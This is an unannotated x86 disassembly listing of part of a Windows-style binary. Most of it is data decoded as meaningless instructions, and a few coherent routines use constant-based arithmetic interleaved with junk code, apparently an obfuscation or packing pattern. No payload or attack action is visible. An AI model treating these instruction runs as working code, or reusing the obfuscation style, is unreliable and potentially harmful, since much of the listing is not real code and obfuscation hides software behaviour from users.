  4058b2:	into   
  4058b3:	adc    ch,dh
  4058b5:	xchg   esi,eax
  4058b6:	ret    
  4058b7:	ret    0xa8d2
  4058ba:	data16 (bad) 
  4058bc:	mov    ds:0xefed45d6,eax
  4058c1:	mov    dl,0x92
  4058c3:	es or  eax,0x49af7c83
  4058c9:	mov    dl,0xc
  4058cb:	xor    esp,ebx
  4058cd:	mov    WORD PTR [edi],gs
  4058cf:	ror    ch,cl
  4058d1:	lea    ebx,[ebp-0x6c76d8c]
  4058d7:	and    edi,edx
  4058d9:	out    dx,al
  4058da:	mov    ebx,0xa09bf618
  4058df:	jns    0x4058b2
  4058e1:	xor    BYTE PTR ds:0x98a021a,0x61
  4058e8:	xor    eax,0xe7d17a74
  4058ed:	pop    es
  4058ee:	add    DWORD PTR [esp+edi*4+0x30d7af87],ecx
  4058f5:	clc    
  4058f6:	sbb    ebx,esi
  4058f8:	mov    ebx,0x7e471077
  4058fd:	xor    DWORD PTR [ebx+0x78785663],ebx
  405903:	jle    0x4058ff
  405905:	jb     0x4058dc
  405907:	ins    DWORD PTR es:[edi],dx
  405908:	adc    eax,0x739f8fbe
  40590d:	pop    ebp
  40590e:	lahf   
  40590f:	xchg   edx,eax
  405910:	pop    eax
  405911:	adc    eax,0x887beace
  405916:	rcr    DWORD PTR [eax-0x74c5ef39],1
  40591c:	ins    DWORD PTR es:[edi],dx
  40591d:	(bad)  
  40591e:	rcl    BYTE PTR [eax],1
  405920:	test   eax,0x8f87cd32
  405925:	fadd   QWORD PTR [ecx+ecx*2+0x7077d889]
  40592c:	mov    eax,0xa99089a8
  405931:	mov    eax,0xb359ccd7
  405936:	mov    ebp,?
  405938:	fbld   TBYTE PTR [edi-0x2d]
  40593b:	outs   dx,DWORD PTR ds:[esi]
  40593c:	add    dh,bl
  40593e:	bound  esi,QWORD PTR [edx+0x79]
  405941:	(bad)  [edx+0x6ab6db01]
  405947:	add    ebx,DWORD PTR [ebx+0x33]
  40594a:	push   eax
  40594b:	sbb    BYTE PTR fs:[edx+0x31],ah
  40594f:	in     al,dx
  405950:	enter  0x2042,0x8d
  405954:	mov    WORD PTR [edi],ss
  405956:	mov    esi,ebx
  405958:	dec    esi
  405959:	fbstp  TBYTE PTR [esi+ebx*4+0x39]
  40595d:	fdivr  QWORD PTR [edi-0x7fb2dc2]
  405963:	push   esi
  405964:	xor    al,0x81
  405966:	inc    edx
  405967:	lahf   
  405968:	sub    eax,0xea540ada
  40596d:	cmp    esp,esp
  40596f:	push   esi
  405970:	xchg   esp,eax
  405971:	ss dec edx
  405973:	push   esi
  405974:	sub    edi,DWORD PTR [eax+eax*2]
  405977:	enterw 0xa76c,0xc0
  40597c:	dec    ecx
  40597d:	or     dh,ch
  40597f:	push   ds
  405980:	outs   dx,BYTE PTR ds:[esi]
  405981:	dec    ecx
  405982:	and    BYTE PTR [esp+eax*2],bl
  405985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405986:	mov    al,0x4a
  405988:	out    0x1,eax
  40598a:	ins    DWORD PTR es:[edi],dx
  40598b:	retf   0x4e37
  40598e:	sbb    ecx,DWORD PTR [edi-0x21]
  405991:	mov    eax,0x4d416796
  405996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405997:	cli    
  405998:	inc    ebp
  405999:	fs sub ebx,edx
  40599c:	push   0xffffffcc
  40599e:	mov    ah,0x90
  4059a0:	je     0x4059a5
  4059a2:	xchg   DWORD PTR [ebp-0x22781c38],esp
  4059a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059a9:	cmp    eax,0x8ffd0ce3
  4059ae:	jg     0x4059a5
  4059b0:	in     al,dx
  4059b1:	fst    DWORD PTR [esi+ebx*8-0x4ece73f]
  4059b8:	mov    al,ds:0xf6ba2dd
  4059bd:	push   edi
  4059be:	sbb    DWORD PTR [edx],ecx
  4059c0:	xchg   esp,eax
  4059c1:	inc    eax
  4059c2:	sub    eax,0xca24611d
  4059c7:	pop    ecx
  4059c8:	mov    ds:0x2d11702e,eax
  4059cd:	imul   ecx,eax,0x6c2ff2c1
  4059d3:	add    BYTE PTR [edx],cl
  4059d5:	mov    esi,DWORD PTR [ecx-0x5f]
  4059d8:	in     al,dx
  4059d9:	push   ss
  4059da:	cs mov esi,0x8002208d
  4059e0:	fnstcw WORD PTR [edx-0x40]
  4059e3:	bswap  edx
  4059e5:	popf   
  4059e6:	retf   0x3ad5
  4059e9:	stos   BYTE PTR es:[edi],al
  4059ea:	push   ebp
  4059eb:	lds    esi,FWORD PTR [edx+0x48]
  4059ee:	jo     0x4059e5
  4059f0:	call   0x949f:0x7c9c1e3d
  4059f7:	cwde   
  4059f8:	sbb    dl,0xe6
  4059fb:	sti    
  4059fc:	cli    
  4059fd:	pop    ebp
  4059fe:	retf   0x9225
  405a01:	push   ebx
  405a02:	jmp    0x9cc4:0x8e3dfa9e
  405a09:	xor    BYTE PTR [edx],0x23
  405a0c:	(bad)  
  405a0d:	or     BYTE PTR [ecx-0x4ff3fc58],cl
  405a13:	je     0x405996
  405a15:	jg     0x4059c2
  405a17:	pop    esi
  405a18:	and    ah,bh
  405a1a:	lods   eax,DWORD PTR ds:[esi]
  405a1b:	and    al,0x12
  405a1d:	mov    ds:0x490fb759,eax
  405a22:	inc    ebp
  405a23:	dec    eax
  405a24:	inc    edi
  405a25:	jns    0x405a9b
  405a27:	pusha  
  405a28:	jle    0x405a66
  405a2a:	fnstsw WORD PTR [eax+0x15]
  405a2d:	mov    ebp,0x2737b94b
  405a32:	xchg   ebp,eax
  405a33:	fwait
  405a34:	xchg   edi,eax
  405a35:	and    edi,DWORD PTR [ecx+0x8]
  405a38:	cmp    al,0xb4
  405a3a:	and    al,0x30
  405a3c:	test   eax,0x53661daf
  405a41:	fsubr  st(7),st
  405a43:	sub    dl,dl
  405a45:	push   esp
  405a46:	xor    edi,DWORD PTR [edi]
  405a48:	jg     0x405a2d
  405a4a:	(bad)  
  405a4b:	jmp    0x45c7:0xb2fe94a9
  405a52:	clc    
  405a53:	xor    DWORD PTR [ebp-0x1d7e0764],eax
  405a59:	jnp    0x405ad4
  405a5b:	add    BYTE PTR [eax],al
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fe05
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fdf1,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fdf1
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fdf1,edx
  405a8f:	cmp    DWORD PTR ds:0x42fdf1,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fdf1,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e3db
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fdd9,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fdd9,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fdd9,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e637
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fdd9
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fdd9,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fdd1,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e7f7,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0xcb3e624d
  405b88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b89:	mov    ah,0x84
  405b8b:	xor    dh,BYTE PTR [eax+0x70]
  405b8e:	stos   BYTE PTR es:[edi],al
  405b8f:	jle    0x405c01
  405b91:	jo     0x405bbb
  405b93:	and    eax,0x78ad2a5e
  405b98:	shr    ebp,1
  405b9a:	inc    esi
  405b9b:	mov    ch,0xb3
  405b9d:	inc    edx
  405b9e:	dec    ecx
  405b9f:	cmp    BYTE PTR [ebx+esi*4+0x1cd8b488],bh
  405ba6:	or     eax,0xf410e96a
  405bab:	test   BYTE PTR [edx+0x79f9c82a],cl
  405bb1:	inc    esp
  405bb2:	and    eax,0x9831ddd1
  405bb7:	jg     0x405b64
  405bb9:	fwait
  405bba:	loop   0x405bed
  405bbc:	jb     0x405bc9
  405bbe:	push   ecx
  405bbf:	aad    0xdf
  405bc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bc2:	test   BYTE PTR [eax-0x6f],ch
  405bc5:	scas   eax,DWORD PTR es:[edi]
  405bc6:	ins    DWORD PTR es:[edi],dx
  405bc7:	push   eax
  405bc8:	push   ecx
  405bc9:	mov    bh,0x75
  405bcb:	pop    edi
  405bcc:	je     0x405c28
  405bce:	shl    bh,0x4e
  405bd1:	push   0xb8753ff
  405bd6:	enter  0x5253,0x97
  405bda:	pop    esi
  405bdb:	xlat   BYTE PTR ds:[ebx]
  405bdc:	frstor [edx+0x34]
  405bdf:	(bad)  
  405be0:	mov    dl,0xa4
  405be2:	pop    ss
  405be3:	out    dx,al
  405be4:	daa    
  405be5:	push   es
  405be6:	or     BYTE PTR [ecx+0x2be82e66],bl
  405bec:	sbb    BYTE PTR [ecx],ch
  405bee:	int3   
  405bef:	fsubr  QWORD PTR [edi-0x19]
  405bf2:	in     eax,0x50
  405bf4:	mov    edi,0x3e040293
  405bf9:	cli    
  405bfa:	sub    esp,edx
  405bfc:	xchg   ebp,eax
  405bfd:	mov    ebp,0xd527835e
  405c02:	and    ebp,ebx
  405c04:	xor    eax,0xf8f53dbf
  405c09:	pop    edx
  405c0a:	pop    ebx
  405c0b:	pushf  
  405c0c:	push   ecx
  405c0d:	test   eax,0x5acd6c38
  405c12:	fbld   TBYTE PTR [ecx]
  405c14:	cmp    ecx,DWORD PTR [esi+0x5bc3bb61]
  405c1a:	es pop ebx
  405c1c:	push   0xe25324d2
  405c21:	pop    ecx
  405c22:	fstp   QWORD PTR [ecx+0xf]
  405c25:	sbb    edx,edi
  405c27:	stos   BYTE PTR es:[edi],al
  405c28:	test   eax,0x2e745519
  405c2d:	xchg   DWORD PTR [edi+0x13],esi
  405c30:	adc    esp,DWORD PTR [ebp+ecx*1-0x9]
  405c34:	fs dec esp
  405c36:	hlt    
  405c37:	mov    ds:0xc7fa4970,eax
  405c3c:	in     eax,dx
  405c3d:	inc    eax
  405c3e:	js     0x405c82
  405c40:	cmp    ebx,DWORD PTR [esi+0x42]
  405c43:	pop    ecx
  405c44:	fidivr WORD PTR [edi+0x18]
  405c47:	hlt    
  405c48:	or     cl,cl
  405c4a:	lods   eax,DWORD PTR ds:[esi]
  405c4b:	mov    ds:0xca2c150d,eax
  405c50:	in     al,dx
  405c51:	ror    DWORD PTR [esi],cl
  405c53:	jg     0x405cbb
  405c55:	sbb    esp,DWORD PTR [edi-0x5772c780]
  405c5b:	mov    esp,0x606b4ed
  405c60:	sahf   
  405c61:	jnp    0x405bef
  405c63:	mov    al,ds:0x3d50f7a6
  405c68:	cld    
  405c69:	jl     0x405cde
  405c6b:	adc    dl,cl
  405c6d:	and    edi,DWORD PTR [edi+0x5a]
  405c70:	cmc    
  405c71:	cmp    BYTE PTR ds:[eax],al
  405c74:	shl    DWORD PTR [edi+0x436a9df],1
  405c7a:	sub    DWORD PTR [eax],ecx
  405c7c:	rcl    ch,0x96
  405c7f:	pop    ss
  405c80:	cmc    
  405c81:	xor    BYTE PTR [eax],dl
  405c83:	mov    ebx,0xd16e3b30
  405c88:	xor    ecx,DWORD PTR [edi+0x667d13ef]
  405c8e:	inc    esp
  405c8f:	sbb    al,0xe4
  405c91:	leave  
  405c92:	das    
  405c93:	outs   dx,DWORD PTR ds:[esi]
  405c94:	mov    edi,0xa1b5840
  405c99:	xor    bl,ah
  405c9b:	jnp    0x405c44
  405c9d:	pop    ss
  405c9e:	out    dx,eax
  405c9f:	aaa    
  405ca0:	pushf  
  405ca1:	rol    bl,1
  405ca3:	vmrun  
  405ca6:	in     al,0xd2
  405ca8:	adc    BYTE PTR [edx],dl
  405caa:	std    
  405cab:	sbb    DWORD PTR [eax],esp
  405cad:	dec    edi
  405cae:	xor    eax,0x52ad99e0
  405cb3:	loop   0x405c77
  405cb5:	popa   
  405cb6:	mov    BYTE PTR [eax+0x112f346c],al
  405cbc:	and    al,0xb7
  405cbe:	das    
  405cbf:	push   ecx
  405cc0:	repnz xor al,0x33
  405cc3:	fcomp  DWORD PTR [ebp+edi*4+0x598bd9a1]
  405cca:	fisttp WORD PTR [ebp-0x56]
  405ccd:	gs push ds
  405ccf:	pop    ebp
  405cd0:	push   eax
  405cd1:	mov    bl,0xf1
  405cd3:	push   cs
  405cd4:	imul   DWORD PTR [edx+edx*1+0x31cc6483]
  405cdb:	shl    BYTE PTR [esi-0x72635eed],0x31
  405ce2:	shl    BYTE PTR [eax+0x6fcc309c],1
  405ce8:	nop
  405ce9:	or     BYTE PTR [esi+0x30],0x32
  405ced:	fwait
  405cee:	add    BYTE PTR [esi+ebp*1-0x80],al
  405cf2:	mov    al,0x49
  405cf4:	loopne 0x405d66
  405cf6:	ret    
  405cf7:	sti    
  405cf8:	cli    
  405cf9:	lock hlt 
  405cfb:	mov    ch,0x4a
  405cfd:	aas    
  405cfe:	mov    bh,BYTE PTR [edi+esi*1-0x40e41c8d]
  405d05:	xchg   ecx,eax
  405d06:	scas   al,BYTE PTR es:[edi]
  405d07:	mov    ebp,0x7f038448
  405d0c:	dec    edx
  405d0d:	adc    bh,BYTE PTR [eax-0x2350759f]
  405d13:	and    bh,BYTE PTR [edi-0x331b29f5]
  405d19:	xlat   BYTE PTR ds:[ebx]
  405d1a:	aaa    
  405d1b:	clc    
  405d1c:	xchg   ebx,eax
  405d1d:	pop    ebp
  405d1e:	mov    ecx,DWORD PTR [eax+0x1bf2044f]
  405d24:	dec    eax
  405d25:	mov    ebp,0xb6ca84b4
  405d2a:	jmp    0x2f8b13ef
  405d2f:	ds push ds
  405d31:	ret    
  405d32:	out    0x2d,al
  405d34:	repz fsubr st(5),st
  405d37:	sub    eax,0x904d984d
  405d3c:	test   eax,0x399fdf47
  405d41:	mov    bl,0x2
  405d43:	test   bl,bh
  405d45:	js     0x405d35
  405d47:	or     al,0xf9
  405d49:	js     0x405d7d
  405d4b:	lods   eax,DWORD PTR ds:[esi]
  405d4c:	inc    edi
  405d4d:	lods   al,BYTE PTR ds:[esi]
  405d4e:	adc    eax,0xfcea51a4
  405d53:	into   
  405d54:	add    ah,BYTE PTR [ebp+0x1e95fcf7]
  405d5a:	jae    0x405dcc
  405d5c:	or     ebx,ebx
  405d5e:	xlat   BYTE PTR ds:[ebx]
  405d5f:	scas   eax,DWORD PTR es:[edi]
  405d60:	out    dx,eax
  405d61:	retf   
  405d62:	pusha  
  405d63:	clc    
  405d64:	and    ah,al
  405d66:	lock mov al,0x58
  405d69:	adc    eax,0x89d48307
  405d6e:	lods   al,BYTE PTR ds:[esi]
  405d6f:	jmp    0x405dbd
  405d71:	wbinvd 
  405d73:	clc    
  405d74:	sbb    BYTE PTR [edx],cl
  405d76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d77:	push   cs
  405d78:	sbb    esi,DWORD PTR [edi-0x6]
  405d7b:	and    edx,edi
  405d7d:	arpl   WORD PTR [eax+0x71],bx
  405d80:	imul   ebp,ecx,0x1c5599d2
  405d86:	loopne 0x405dfe
  405d88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d89:	out    dx,al
  405d8a:	mov    BYTE PTR [esi-0x77],cl
  405d8d:	rcl    BYTE PTR [esi-0x6997449],1
  405d93:	test   DWORD PTR [edi],ecx
  405d95:	inc    ebx
  405d96:	and    DWORD PTR [ecx*1+0x3228f385],ebx
  405d9d:	arpl   WORD PTR [eax+0x2e3e53e2],bp
  405da3:	cld    
  405da4:	ins    BYTE PTR es:[edi],dx
  405da5:	arpl   si,cx
  405da7:	ss mov edx,0x25d93ff2
  405dad:	mov    al,ds:0xd8440442
  405db2:	shr    BYTE PTR [ecx-0x7067dfdf],cl
  405db8:	pop    ebp
  405db9:	das    
  405dba:	loopne 0x405e14
  405dbc:	mov    dl,0xa0
  405dbe:	inc    ebx
  405dbf:	out    0x41,eax
  405dc1:	cmp    ebx,edi
  405dc3:	repz and BYTE PTR [ebp+0x51],ah
  405dc7:	pop    esi
  405dc8:	das    
  405dc9:	inc    ecx
  405dca:	push   ss
  405dcb:	js     0x405d5a
  405dcd:	sti    
  405dce:	shr    DWORD PTR [esi+eiz*1+0x5392f4bb],cl
  405dd5:	aad    0x58
  405dd7:	jmp    0x405deb
  405dd9:	mov    esp,0x5deb73e8
  405dde:	sbb    BYTE PTR [ecx],cl
  405de0:	idiv   DWORD PTR [ecx+edi*1+0x16ccacb6]
  405de7:	sub    DWORD PTR [ebx+0x3e],edi
  405dea:	inc    ebx
  405deb:	ror    DWORD PTR [ebp-0x223813ae],cl
  405df1:	pop    ds
  405df2:	jecxz  0x405de3
  405df4:	jmp    0xafcd:0xd4023df9
  405dfb:	xor    DWORD PTR [ecx+edx*2],ebp
  405dfe:	jno    0x405e00
  405e00:	pop    ss
  405e01:	popa   
  405e02:	es idiv ebp
  405e05:	pop    edx
  405e06:	std    
  405e07:	inc    ebp
  405e08:	mov    dh,0x24
  405e0a:	jne    0x405e2a
  405e0c:	bswap  ebp
  405e0e:	push   ecx
  405e0f:	add    DWORD PTR [edx+esi*2-0x4d59343e],eax
  405e16:	lods   eax,DWORD PTR ds:[esi]
  405e17:	xor    cl,dl
  405e19:	lahf   
  405e1a:	pop    edi
  405e1b:	out    dx,al
  405e1c:	jmp    0x405da0
  405e1e:	(bad)  
  405e1f:	icebp  
  405e20:	xor    ebx,DWORD PTR [esi+0x12]
  405e23:	jp     0x405e1b
  405e25:	jb     0x405db7
  405e27:	cmp    ch,BYTE PTR [ebp+esi*2+0x5d]
  405e2b:	cmp    edi,ebx
  405e2d:	dec    ebp
  405e2e:	inc    edx
  405e2f:	or     al,0xe9
  405e31:	ret    0xd9a1
  405e34:	or     eax,0x3db75e1
  405e39:	xchg   DWORD PTR [eax-0x40],esp
  405e3c:	pushf  
  405e3d:	fld    QWORD PTR [edx]
  405e3f:	jne    0x405e77
  405e41:	cmp    dl,cl
  405e43:	dec    eax
  405e44:	xchg   ebx,eax
  405e45:	and    BYTE PTR [eax+0x3c233ad],ch
  405e4b:	ror    DWORD PTR [ebx-0x50f0f3b3],0xc1
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e80f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e7ef,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fe01,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0x2e
  405ea8:	(bad)  
  405ea9:	out    dx,eax
  405eaa:	push   0x70703f3e
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405f2c
  405eb4:	inc    ecx
  405eb5:	mov    esp,0x3cd6471
  405eba:	pop    esi
  405ebb:	out    dx,eax
  405ebc:	xchg   DWORD PTR [eax+0x42e4c4a0],esp
  405ec2:	ja     0x405ec0
  405ec4:	call   FWORD PTR [edi]
  405ec6:	and    ah,BYTE PTR [edi+0x5a]
  405ec9:	push   es
  405eca:	repnz inc eax
  405ecc:	mov    ?,WORD PTR [edi+0x22353172]
  405ed2:	pusha  
  405ed3:	xlat   BYTE PTR ds:[ebx]
  405ed4:	test   al,0x40
  405ed6:	(bad)  
  405ed7:	icebp  
  405ed8:	sub    DWORD PTR [esi],edi
  405eda:	cs jge 0x405eb1
  405edd:	sbb    BYTE PTR [esi],ch
  405edf:	push   ds
  405ee0:	sbb    dl,BYTE PTR [edx+0x6642fbea]
  405ee6:	(bad)  
  405ee8:	popf   
  405ee9:	jl     0x405e81
  405eeb:	or     BYTE PTR [edi],bh
  405eed:	push   0xffffffc0
  405eef:	cdq    
  405ef0:	mov    esp,0xf4a5d807
  405ef5:	push   eax
  405ef6:	call   0x41ff:0xce554251
  405efd:	mov    BYTE PTR [edx+ebx*1+0x3a],bh
  405f01:	add    ah,BYTE PTR [eax]
  405f03:	mov    ebp,?
  405f05:	and    al,0x4a
  405f07:	jnp    0x405efb
  405f09:	or     eax,0xb097115e
  405f0e:	out    0xd6,al
  405f10:	xchg   edi,eax
  405f11:	adc    eax,0x878334da
  405f16:	fmul   DWORD PTR [edx+0xf]
  405f19:	mov    ebp,0xb3924356
  405f1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f1f:	outs   dx,DWORD PTR ds:[esi]
  405f20:	xor    DWORD PTR [edi+0x1d],esp
  405f23:	pop    es
  405f24:	inc    edi
  405f25:	pop    edx
  405f26:	and    al,0xf2
  405f28:	imul   ebx,DWORD PTR [eax+0x32],0x6c
  405f2c:	cli    
  405f2d:	xor    DWORD PTR [eax],esi
  405f2f:	mov    dh,0xd6
  405f31:	mov    dl,0xb4
  405f33:	mov    ebp,0x777af752
  405f38:	push   esi
  405f39:	(bad)  
  405f3a:	dec    ebp
  405f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f3c:	mov    bh,BYTE PTR [esi-0xb]
  405f3f:	mov    dh,0x10
  405f41:	repnz (bad) 
  405f43:	leave  
  405f44:	add    eax,0x95bd230a
  405f49:	pop    bx
  405f4b:	stos   BYTE PTR es:[edi],al
  405f4c:	cld    
  405f4d:	imul   edi,DWORD PTR [edx+0xbfb77bc],0xffffffaf
  405f54:	mov    ecx,0xd8b0cc53
  405f59:	hlt    
  405f5a:	in     eax,0x74
  405f5c:	aaa    
  405f5d:	xor    BYTE PTR [esi+0xf],dl
  405f60:	fistp  QWORD PTR [ebx-0x3cdafa64]
  405f66:	outs   dx,DWORD PTR ds:[esi]
  405f67:	out    0xa3,eax
  405f69:	sahf   
  405f6a:	or     edx,DWORD PTR [eax]
  405f6c:	sbb    esi,DWORD PTR [ecx-0x461f7dbb]
  405f72:	aas    
  405f73:	pop    edx
  405f74:	add    ah,dl
  405f76:	(bad)  
  405f78:	(bad)  
  405f7a:	fstp   DWORD PTR [esi-0x2e]
  405f7d:	or     al,0x7
  405f7f:	adc    DWORD PTR [ebx+0x737a6cfc],ebp
  405f85:	xchg   esp,eax
  405f86:	arpl   WORD PTR [edi-0x725ffa59],dx
  405f8c:	fwait
  405f8d:	mov    ch,0x34
  405f8f:	aam    0xfe
  405f91:	sbb    esp,DWORD PTR [ebx+0x6e1160a9]
  405f97:	int    0x3c
  405f99:	out    0x5e,al
  405f9b:	xor    eax,0xed266983
  405fa0:	pop    eax
  405fa1:	xchg   esp,eax
  405fa2:	mov    dl,0x8f
  405fa4:	or     BYTE PTR [edi],cl
  405fa6:	enter  0xdcd5,0x34
  405faa:	mov    ds:0x78380619,eax
  405faf:	and    al,al
  405fb1:	and    al,BYTE PTR [eax+0x7f]
  405fb4:	adc    DWORD PTR [ecx-0x5],ebx
  405fb7:	cmp    ebx,DWORD PTR [edx-0x4d]
  405fba:	js     0x405fc6
  405fbc:	cwde   
  405fbd:	jno    0x405f9e
  405fbf:	das    
  405fc0:	aaa    
  405fc1:	shl    BYTE PTR [edx-0x7286245f],cl
  405fc7:	jns    0x405fe2
  405fc9:	jo     0x6cd58d55
  405fcf:	mov    bh,0x69
  405fd1:	neg    DWORD PTR [edx]
  405fd3:	repnz iret 
  405fd5:	aad    0xb
  405fd7:	addr16 push esi
  405fd9:	popa   
  405fda:	jg     0x405fc2
  405fdc:	stc    
  405fdd:	retf   
  405fde:	ds cwde 
  405fe0:	pusha  
  405fe1:	(bad)  
  405fe2:	arpl   sp,bp
  405fe4:	ficomp DWORD PTR [edi]
  405fe6:	int    0x19
  405fe8:	cmp    BYTE PTR [edx],cl
  405fea:	mov    bh,0x5c
  405fec:	aad    0x37
  405fee:	mov    WORD PTR [esi],fs
  405ff0:	push   ds
  405ff1:	adc    BYTE PTR [ebp-0xb],0x40
  405ff5:	retf   0x5f2a
  405ff8:	or     DWORD PTR [esi*1+0x47f35261],edi
  405fff:	sbb    BYTE PTR [edx-0x7b536fce],ah
  406005:	xchg   ebp,eax
  406006:	leave  
  406007:	jmp    0x405fb5
  406009:	adc    eax,0xa5e3ac90
  40600e:	mov    BYTE PTR [ebx+0x6b],ah
  406011:	add    edi,DWORD PTR [ebp-0x73]
  406014:	mov    eax,ds:0x3779b6bf
  406019:	xlat   BYTE PTR ds:[ebx]
  40601a:	js     0x406089
  40601c:	mov    esi,0x10c6db34
  406021:	push   cs
  406022:	scas   al,BYTE PTR es:[edi]
  406023:	or     edx,esi
  406025:	(bad)
  40602a:	dec    edi
  40602b:	pop    edi
  40602c:	sub    dl,BYTE PTR [edx]
  40602e:	pop    ds
  40602f:	inc    ebp
  406030:	arpl   WORD PTR [eax-0x4028acf7],bp
  406036:	or     eax,0xcfe1956
  40603b:	pop    edx
  40603c:	adc    BYTE PTR [eax+edx*4-0x12],cl
  406040:	test   BYTE PTR [ecx+eax*8+0x3cca103],bl
  406047:	div    DWORD PTR [ebx+0x6b]
  40604a:	dec    edi
  40604b:	mov    cl,0x71
  40604d:	ds loope 0x405ffd
  406050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406051:	data16 jno 0x406020
  406054:	push   esp
  406055:	loopne 0x406010
  406057:	in     eax,dx
  406058:	mov    esp,0x5e919b9
  40605d:	pushf  
  40605e:	jb     0x406092
  406060:	add    BYTE PTR [ecx+0x42fe860d],al
  406066:	add    ah,ah
  406068:	or     al,BYTE PTR [eax]
  40606a:	add    BYTE PTR [ecx+0xc458b02],cl
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e218
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fe76,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fdf1,0x42e21c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fdd1,0x42e7fb
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fe82,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fdd5,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fe05
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0xcc024796
  4060dc:	je     0x406143
  4060de:	ds jo  0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x40612e
  4060e6:	nop
